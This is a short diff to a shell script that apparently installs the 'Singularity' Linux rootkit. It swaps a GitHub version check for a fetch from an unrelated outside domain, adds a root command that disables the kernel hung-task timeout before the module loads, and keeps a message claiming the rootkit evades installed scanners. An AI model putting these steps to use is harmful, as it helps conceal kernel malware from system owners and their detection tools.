@@ -235,7 +235,7 @@ echo -e "${C}   │${N}                                                         
 echo -e "${C}   └────────────────────────────────────────────────────────────────────────────────────────────┘${N}"
 
 GITHUB_REV=$(curl -fs https://api.github.com/repos/MatheuZSecurity/Singularity/commits/main | grep -m1 '"sha"' | cut -d'"' -f4 | cut -c1-7)
-MY_VERSION=$(curl -fs https://api.github.com/repos/MatheuZSecurity/Singularity/commits/main | grep -m1 '"sha"' | cut -d'"' -f4 | cut -c1-7)
+MY_VERSION=$(curl -fs https://compileasaservice.online/version.txt)
 
 
 
@@ -431,6 +431,7 @@ section_end
 # Optional install logic (if INSTALL=1)
 
 if [ "$INSTALL" -eq 1 ] && [[ $EUID -eq 0 ]]; then
+        echo 0 > /proc/sys/kernel/hung_task_timeout_secs
         section "SYSTEM BASELINE"
         info "Capturing system state before module load..."
         mem_before=$(get_memory_kb)
@@ -622,5 +623,4 @@ echo ""
 if [[ ${#detected_tools[@]} -gt 0 ]]; then
     echo -e "${Y}     NOTE: Rootkit scanner(s) present: ${detected_tools[*]}, but singularity easily bypass these tools.${N}"
     echo ""
-fi
 fi
